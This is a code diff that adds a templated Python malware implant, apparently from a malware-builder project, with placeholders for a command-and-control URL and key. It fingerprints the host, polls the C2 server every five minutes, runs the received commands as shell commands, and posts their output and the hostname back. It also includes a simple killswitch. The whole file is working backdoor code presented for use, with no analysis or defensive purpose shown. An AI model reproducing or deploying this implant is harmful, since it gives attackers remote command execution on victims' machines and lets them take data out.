@@ -1,0 +1,82 @@
+import base64
+import time
+import json
+import requests
+import socket
+import subprocess
+import sys
+
+activate_killswitch = {{ activate_killswitch }}
+
+def get_host_id():
+    hostname = socket.gethostname()
+    encoded_id = base64.b64encode(hostname.encode()).decode()
+    return hostname, encoded_id
+
+def killswitch():
+    # Implémentation basique, désactivée si activate_killswitch False
+    if activate_killswitch:
+        # Ex: ping google or any condition
+        try:
+            r = requests.get("https://www.google.com", timeout=3)
+            if r.status_code == 200:
+                return False
+        except:
+            return True
+    return False
+
+def get_commands(c2_url, malware_key, host_id):
+    payload = {
+        "key": malware_key,
+        "host_id": host_id
+    }
+    try:
+        response = requests.post(c2_url, json=payload, timeout=10)
+        if response.status_code == 200:
+            return response.json().get("cmds", [])
+    except Exception as e:
+        # Optionnel : log erreur
+        pass
+    return []
+
+def execute_commands(commands):
+    results = []
+    for cmd in commands:
+        try:
+            completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+            output = completed.stdout + completed.stderr
+        except Exception as e:
+            output = f"Error executing '{cmd}': {str(e)}"
+        results.append({
+            "command": cmd,
+            "output": output
+        })
+    return results
+
+def send_results(c2_url, malware_key, host_id, hostname, results):
+    payload = {
+        "key": malware_key,
+        "host_id": host_id,
+        "hostname": hostname,
+        "results": results
+    }
+    try:
+        requests.post(c2_url, json=payload, timeout=10)
+    except:
+        pass
+
+def main():
+    if killswitch():
+        sys.exit()
+
+    hostname, host_id = get_host_id()
+
+    while True:
+        cmds = get_commands("{{ c2_url }}", "{{ malware_key }}", host_id)
+        if cmds:
+            results = execute_commands(cmds)
+            send_results("{{ c2_url }}", "{{ malware_key }}", host_id, hostname, results)
+        time.sleep(300)  # toutes les 5 minutes
+
+if __name__ == "__main__":
+    main()
